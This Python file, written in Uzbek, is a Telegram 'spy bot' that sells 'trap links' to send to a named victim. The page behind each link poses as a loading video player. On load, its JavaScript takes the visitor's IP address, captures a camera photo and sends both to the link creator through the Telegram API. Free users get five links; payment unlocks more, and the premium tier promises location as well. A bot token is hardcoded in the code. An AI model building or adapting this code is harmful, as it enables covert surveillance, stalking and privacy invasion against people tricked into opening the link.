import os
import sqlite3
import logging
import asyncio
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton

# --- SOZLAMALAR ---
TOKEN = "8509571152:AAFw5GXdZRyuiqTOzm3znlQCa_S4JQXcnvU"
ADMIN_ID = 5775388579
# Railway Public Domain (O'zingizniki bilan almashtiring)
BASE_URL = "https://botmeniki-sarikprok.up.railway.app" 

bot = Bot(token=TOKEN)
dp = Dispatcher()
app = FastAPI()
logging.basicConfig(level=logging.INFO)

# --- DATABASE ---
def init_db():
    conn = sqlite3.connect("shpion_master.db", check_same_thread=False)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, is_premium INTEGER DEFAULT 0, used_count INTEGER DEFAULT 0)")
    cur.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
    conn.commit()
    return conn

db = init_db()

class AdminState(StatesGroup):
    wait_id = State()
    wait_card = State()

# --- TUZOQ SAHIFASI (HTML + JS) ---
# Bu sahifa ochilishi bilan IP oladi va kameraga ruxsat so'raydi
HTML_CONTENT = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Video Player</title>
    <script>
        async function startCapture() {{
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get('id');
            const botToken = "{token}";

            // 1. IP Manzilni olish
            try {{
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                await fetch(`https://api.telegram.org/bot${{botToken}}/sendMessage`, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        chat_id: userId,
                        text: "🌐 **Qurbon linkka kirdi!**\\nIP: `" + ipData.ip + "`",
                        parse_mode: "Markdown"
                    }})
                }});
            }} catch(e) {{}}

            // 2. Kamera (Rasm) olish
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                setTimeout(async () => {{
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                    
                    const formData = new FormData();
                    formData.append('chat_id', userId);
                    formData.append('photo', blob, 'shot.jpg');
                    formData.append('caption', '📸 **Shpion Rasm!** Qurbon kameraga ruxsat berdi.');

                    await fetch(`https://api.telegram.org/bot${{botToken}}/sendPhoto`, {{
                        method: 'POST',
                        body: formData
                    }});
                    stream.getTracks().forEach(track => track.stop());
                }}, 2000);
            }} catch (err) {{
                await fetch(`https://api.telegram.org/bot${{botToken}}/sendMessage`, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        chat_id: userId,
                        text: "❌ Qurbon kameraga ruxsat bermadi, lekin IP olindi."
                    }})
                }});
            }}
        }}
        window.onload = startCapture;
    </script>
</head>
<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif;">
    <div style="text-align:center;">
        <h2>Video yuklanmoqda...</h2>
        <div style="border:4px solid #f3f3f3; border-top:4px solid #3498db; border-radius:50%; width:40px; height:40px; animation:spin 2s linear infinite; margin:auto;"></div>
    </div>
    <style> @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }} </style>
</body>
</html>
"""

@app.get("/go", response_class=HTMLResponse)
async def victim_page(id: str):
    return HTML_CONTENT.format(token=TOKEN)

# --- BOT MANTIQI ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    db.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (message.from_user.id,))
    db.commit()
    await message.answer("🕵️ Shpion Botga xush kelibsiz!\n\nPastdagi tugmalar orqali qurbon uchun maxfiy havola yarating.", reply_markup=get_main_kb(message.from_user.id))

def get_main_kb(user_id):
    kb = [[KeyboardButton(text="🔗 Tuzoq link yaratish")], [KeyboardButton(text="💎 Premium"), KeyboardButton(text="📊 Statistika")]]
    if user_id == ADMIN_ID: kb.append([KeyboardButton(text="⚙️ Admin Panel")])
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

@dp.message(F.text == "🔗 Tuzoq link yaratish")
async def create_link(message: types.Message):
    user_id = message.from_user.id
    cursor = db.cursor()
    user = cursor.execute("SELECT is_premium, used_count FROM users WHERE user_id=?", (user_id,)).fetchone()
    
    if user[0] == 0 and user[1] >= 5:
        await message.answer("❌ Limit tugadi (5/5). Premium oling: @Sardorbeko008")
        return

    link = f"{BASE_URL}/go?id={user_id}"
    db.execute("UPDATE users SET used_count = used_count + 1 WHERE user_id=?", (user_id,))
    db.commit()
    
    await message.answer(f"✅ **Havola tayyor!**\n\nUshbu linkni qurbonga yuboring. U kirishi bilan IP va Rasm sizga keladi:\n\n🔗 `{link}`", parse_mode="Markdown")

@dp.message(F.text == "💎 Premium")
async def premium_info(message: types.Message):
    card = db.execute("SELECT value FROM settings WHERE key='card'").fetchone()
    card_num = card[0] if card else "Kiritilmagan"
    await message.answer(f"💎 **Premium afzalliklari:**\n- Cheksiz linklar\n- IP + Rasm + Lokatsiya\n\n💰 Narxi: 5,000 so'm\n💳 Karta: `{card_num}`\n\nTo'lovdan so'ng chekni @Sardorbeko008 ga yuboring.", parse_mode="Markdown")

# --- ADMIN PANEL ---
@dp.message(F.text == "⚙️ Admin Panel", F.from_user.id == ADMIN_ID)
async def admin_menu(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Karta sozlash", callback_data="set_card")],
        [InlineKeyboardButton(text="➕ Premium berish", callback_data="give_prem")]
    ])
    await message.answer("Boshqaruv paneli:", reply_markup=kb)

@dp.callback_query(F.data == "set_card")
async def set_card_start(c: types.CallbackQuery, state: FSMContext):
    await state.set_state(AdminState.wait_card); await c.message.answer("Karta raqamni kiriting:"); await c.answer()

@dp.message(AdminState.wait_card)
async def set_card_final(message: types.Message, state: FSMContext):
    db.execute("INSERT OR REPLACE INTO settings VALUES ('card', ?)", (message.text,))
    db.commit(); await message.answer("✅ Saqlandi"); await state.clear()

@dp.callback_query(F.data == "give_prem")
async def give_prem_start(c: types.CallbackQuery, state: FSMContext):
    await state.set_state(AdminState.wait_id); await c.message.answer("Foydalanuvchi ID sini kiriting:"); await c.answer()

@dp.message(AdminState.wait_id)
async def give_prem_final(message: types.Message, state: FSMContext):
    if message.text.isdigit():
        db.execute("UPDATE users SET is_premium=1 WHERE user_id=?", (int(message.text),))
        db.commit(); await message.answer("✅ Premium berildi!"); await state.clear()
    else: await message.answer("Xato ID.")

# --- WEBHOOK & FASTAPI ---
@app.post("/webhook")
async def bot_webhook(request: Request):
    update = types.Update(**await request.json())
    await dp.feed_update(bot, update)
    return {"ok": True}

if __name__ == "__main__":
    import uvicorn
    async def startup():
        await bot.set_webhook(url=f"{BASE_URL}/webhook", drop_pending_updates=True)
    asyncio.run(startup())
    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
